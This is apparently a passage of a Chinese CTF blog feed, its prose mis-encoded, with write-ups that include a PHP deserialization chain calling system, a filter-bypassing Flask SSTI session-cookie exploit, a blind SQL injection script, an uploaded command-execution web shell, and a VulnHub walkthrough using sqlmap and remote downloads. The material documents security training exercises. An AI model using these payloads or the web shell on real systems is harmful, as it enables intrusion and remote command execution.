punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Crypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞ÁªìÊûú<br><code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code><br>ËøôÈáåÂ∞Ü<code>i:0</code>Êîπ‰∏∫<code>i:1</code>Âç≥ÂèØÁªïËøáthrowÊàêÂäüËß¶Âèë<code>__destruct()</code><br><code>a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/949cac6db39a4b47a7c3f37641e35358.png" alt="456"></p><h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p>Áü•ËØÜÁÇπÔºöSSTI<br><img src="https://img-blog.csdnimg.cn/433667ad644a4d51bb2825e80fa85c05.png" alt="123"><br>url‰∏∫Ôºö<code>http://007b1ed3-c9a0-400b-bc74-007f54a2966c.node4.buuoj.cn:81/download?file=1.jpg</code><br>ÂèØ‰ª•ËØïËØï‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÔºåÂèëÁé∞ÊàêÂäü‰∫Ü„ÄÇ<br>Áî±‰∫édockerÈáåÁî®ÁöÑÊòØflaskÔºåÂèØ‰ª•Â∞ùËØïÁúãÁúãÊ∫êÁ†Å‰ΩçÁΩÆÔºåÊúÄÂêéÂèëÁé∞Âú®&#x2F;app&#x2F;app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token keyword">from</span> config <span class="token keyword">import</span> secret_keyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># put application's code here</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cancanneed"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cancanneed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    all_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'img.html'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">,</span> all_filename<span class="token operator">=</span>all_filename<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> &lt;br> &lt;a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&lt;/a>"</span></span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"start"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/backdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>        name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>                <span class="token string">r'__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span><span class="token punctuation">,</span>                name<span class="token punctuation">)</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>                <span class="token string">'Á´üÁÑ∂Áªô&lt;h1>%s&lt;/h1>‰Ω†ÊâæÂà∞‰∫ÜÊàëÁöÑÂêéÈó®Ôºå‰Ω†‰∏ÄÂÆöÊòØÁΩëÁªúÂÆâÂÖ®Â§ßËµõÂÜ†ÂÜõÂêßÔºÅüòù &lt;br> ÈÇ£‰πà Áé∞Âú®ËΩÆÂà∞‰Ω†‰∫Ü!&lt;br> ÊúÄÂêéÁ•ùÊÇ®Áé©ÂæóÊÑâÂø´!üòÅ'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_find</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖ∂‰∏≠ÁúãÂà∞Ëøô‰∏ÄÁÇπÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> config <span class="token keyword">import</span> secret_keyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ËØ¥ÊòéËøòÂ≠òÂú®‰∏Ä‰∏™keyÔºåËøô‰∏™Êó∂ÂÄôÊÉ≥Âà∞‰∫ÜÂèØËÉΩÊòØsession‰º™ÈÄ†Ôºå‰ΩÜÊòØÂêéÈù¢ÊâçÁü•ÈÅìËá™Â∑±Èîô‰∫Ü„ÄÇ<br>ÂºÄÂßãÂØªÊâækeyÔºöÂ∞ùËØïËØªÂèñconfig.pyÊñá‰ª∂ÔºåËøòÁúüÂèëÁé∞key‰∫Ü„ÄÇ<br>ËÆøÈóÆ&#x2F;backdoor<br><img src="https://img-blog.csdnimg.cn/9e10aa25386245fcab49d3ac50e42782.png" alt="789"><br>ÁªìÂêàÊ∫êÁ†ÅËøôÈáåguestÊòØÊ≥®ÂÖ•ÁÇπ„ÄÇ<br>ÊúÄÂêéÁöÑexpÔºö</p><blockquote><p><code>python flask_session_cookie_manager3.py encode -s &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; -t &quot;&#123;&#39;user&#39;:\&quot;&#123;% print(()['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[280]('paste /y0U3_f14g_1s_h3re',shell=True,stdout=-1)['communic''ate']()[0]['strip']())%&#125;\&quot;&#125;&quot;</code></p></blockquote><h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src="https://img-blog.csdnimg.cn/b2e48cac738542c2b9d600cbb190c40b.png" alt="456"><br>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Author: f0njl//Ëøô‰∏™ÊòØÂ§ß‰Ω¨ÔºÅÔºÅÔºÅ</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> datetimeurl <span class="token operator">=</span> <span class="token string">"http://5e08a16e-94a2-4d92-8e7a-85d3c1cf93b0.node4.buuoj.cn:81/?id="</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789asdfghjklzxcvbnmqwertyuiop&#125;&#123;-_."</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#payload = "1/**/and/**/if(substr(database(),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(2),1)--".format(i,j)</span>        <span class="token comment">#payload = "1/**/and/**/if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(3),1)--".format(i,j)</span>        payload <span class="token operator">=</span> <span class="token string">"1/**/and/**/if(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(5),1)--"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds        <span class="token keyword">if</span> sec <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>Ëøô‰∏™Áúã‰∫ÜwpÔºåÊàëÊòØÁúüÁöÑÊ≤°ÊúâÊÉ≥Âà∞:cry:</p><p>Êï¥‰ΩìÊÄùË∑ØÂ∞±ÊòØÂÜç‰∏ä‰º†‰∏Ä‰∏™app.pyÊñá‰ª∂Â∞ÜÂéüÊù•ÁöÑË¶ÜÁõñÊéâÔºåËÄå‰∏îËá™Â∑±‰∏ä‰º†ÁöÑapp.pyÊñá‰ª∂ÂèØ‰ª•ËøõË°åÂëΩ‰ª§ÊâßË°å</p><p>‰∏ä‰º†ÁöÑapp.pyÊñá‰ª∂</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ÁºñÂÜô‰∏Ä‰∏™ËÉΩÂ§üÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÁöÑapp.pyÊñá‰ª∂</span><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>        data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> data    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®ËÆøÈóÆ‰∏ªÈ°µÈù¢ÂèëÁé∞È°µÈù¢ÊòæÁ§∫1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p><p>ÁÑ∂ÂêéÂëΩ‰ª§ÊâßË°åÊâæÂà∞flagÊñá‰ª∂Âç≥ÂèØ<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lord-Of-The-Root-1-0-1</title>
      <link href="/2023/09/11/Lord-Of-The-Root-1-0-1/"/>
      <url>/2023/09/11/Lord-Of-The-Root-1-0-1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>1„ÄÅÈù∂Êú∫‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2„ÄÅÊ∂âÂèäÁü•ËØÜÁÇπÔºö &gt;1„ÄÅÁ´ØÂè£Á¢∞Êíû &gt;2„ÄÅÂÜÖÊ†∏ÊèêÊùÉÔºàUbuntu14.04ÁâàÊú¨Ôºâ &gt;3„ÄÅUDFÊèêÊùÉ</p><h2 id="Èù∂Êú∫Áü•ËØÜÁÇπËÆ∞ÂΩï"><a href="#Èù∂Êú∫Áü•ËØÜÁÇπËÆ∞ÂΩï" class="headerlink" title="Èù∂Êú∫Áü•ËØÜÁÇπËÆ∞ÂΩï"></a>Èù∂Êú∫Áü•ËØÜÁÇπËÆ∞ÂΩï</h2><p>‰ΩøÁî®nmapÊé¢Êµã‰πãÂêéÂèëÁé∞Èù∂Êú∫Âè™ÂºÄÊîæ‰∫Ü22ÔºàsshÔºâÁ´ØÂè£ÔºüÔºü‰ªÄ‰πàÁé©ÊÑèÂÑø„ÄÇ„ÄÇ„ÄÇ Âú®Â∞ùËØïsshÁôªÂΩïÊó∂ÂèëÁé∞‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπÔºö <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> ÁúãÂà∞‰∫Üeasy as 1Ôºå2Ôºå3„ÄÇ ‰ª•Ââç‰πüÊ≤°ÈÅáÂà∞ËøáÔºåÂÜçÊü•ÁúãÂà´‰∫∫ÁöÑÊâìÈù∂ËÆ∞ÂΩï‰πãÂêéÂèëÁé∞ÂéüÊù•ÊòØÂÖ≥‰∫é<strong>Á´ØÂè£Á¢∞ÊíûÔºàPort KnockingÔºâÊäÄÊúØ</strong>ÁöÑÁü•ËØÜÁÇπ„ÄÇ</p><blockquote><p>Á´ØÂè£Á¢∞ÊíûÊòØ‰∏ÄÁßçÈÄöËøáÂú®‰∏ÄÁªÑÈ¢ÑÂÖàÊåáÂÆöÁöÑÂÖ≥Èó≠Á´ØÂè£‰∏ä‰∫ßÁîüËøûÊé•ËØ∑Ê±ÇÔºå‰ªéÂ§ñÈÉ®ÊâìÂºÄÈò≤ÁÅ´Â¢ô‰∏äÁöÑÁ´ØÂè£ÁöÑÊñπÊ≥ï„ÄÇÂ¶ÇÊûúÊî∂Âà∞Ê≠£Á°ÆÁöÑËøûÊé•ËØ∑Ê±ÇÂ∫èÂàóÔºåÈò≤ÁÅ´Â¢ôËßÑÂàôÂ∞±‰ºöË¢´Âä®ÊÄÅÊõ¥ÊîπÔºå‰ªéËÄåÂÖÅËÆ∏ËøûÊé•ËØ∑Ê±ÇÁöÑ‰∏ªÊú∫ÈÄöËøáÁâπÂÆöÁ´ØÂè£ËøõË°åËøûÊé•„ÄÇÂ¶ÇÊûú‰∏çÊòØÊåâÁÖßÁâπÂÆöÁöÑÁ´ØÂè£Â∫èÂàóËøõË°åËØ∑Ê±ÇÔºåÈÇ£‰πàÂèó‰øùÊä§ÁöÑÁ´ØÂè£Â∞±‰ºöÂÖ≥Èó≠„ÄÇ</p></blockquote><p>Èù∂Êú∫Ëøô‰∏™ÊÑèÊÄùÂ∫îËØ•Â∞±ÊòØË¶ÅÊåâÁÖßÁ´ØÂè£1„ÄÅ2„ÄÅ3ÁöÑÂ∫èÂàóËøõË°åËøûÊé•Â∞ùËØï„ÄÇ‰πãÂêéÊâìÂºÄÂèó‰øùÊä§ÁöÑÁ´ØÂè£„ÄÇ <strong>Á´ØÂè£Á¢∞ÊíûÊñπÊ≥ï</strong></p><ul><li>1 knockÂëΩ‰ª§</li></ul><blockquote><p>konck 192.168.206.144 1 2 3 -v</p></blockquote><ul><li>2 nmapÂëΩ‰ª§</li></ul><blockquote><p>ÊåâÊ¨°Â∫èËøõË°åÊåáÂÆöÁ´ØÂè£Êâ´ÊèèÂç≥ÂèØ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p><p>‰πãÂêéÂÜç‰ΩøÁî®nmapÊé¢Êµã„ÄÇ ÂêéÈù¢Âú®ÊâæÂà∞ÁôªÂΩïÈ°µÈù¢‰πãÂêéÂ∞ùËØïËøõË°åsqlÊ≥®ÂÖ•„ÄÇ ÊôÆÈÄöÁöÑÊñπÂºèËøõË°åSQLmapÊ≥®ÂÖ•Êâ´ÊèèÊ≤°ÊâæÂà∞Ôºå‰ΩøÁî®sqllmapËøõË°åÈíàÂØπË°®ÂçïÁöÑÊ≥®ÂÖ•:</p><blockquote><p>sqlmap -o -u <a href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> ‚Äìforms ‚Äìdbs</p></blockquote><p>Âú®ÊãøÂà∞Ë¥¶Âè∑ÂØÜÁ†Å‰πãÂêé‰ΩøÁî®sshÁôªÂΩïÈù∂Êú∫</p><blockquote><p>ssh <a href="mailto:&#x73;&#x6d;&#x65;&#97;&#x67;&#x6f;&#108;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#x30;&#54;&#x2e;&#x31;&#x34;&#x34;">&#x73;&#x6d;&#x65;&#97;&#x67;&#x6f;&#108;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#x30;&#54;&#x2e;&#x31;&#x34;&#x34;</a> MyPreciousR00t</p></blockquote><p>ÁôªÂΩï‰πãÂêéÂΩìÁÑ∂Ë¶ÅÂºÄÂßãÊî∂ÈõÜ‰ø°ÊÅØËøõË°åÊèêÊùÉ‰∫ÜÔºåÊü•ÁúãÁ≥ªÁªüÁâàÊú¨</p><blockquote><p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p></blockquote><p>‰πüÂèØ‰ª•ÁªôÈù∂Êú∫‰∏ä‰º†‰∏Ä‰∏™‰ø°ÊÅØÊî∂ÈõÜÊñá‰ª∂ Êú¨Êú∫‰ΩøÁî®pythonÂºÄÂêØ‰∏Ä‰∏™httpÊúçÂä°</p><blockquote><p>python -m http.server</p></blockquote><p>Èù∂Êú∫‰∏ãËΩΩÊñá‰ª∂</p><blockquote><p>wget <a href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh 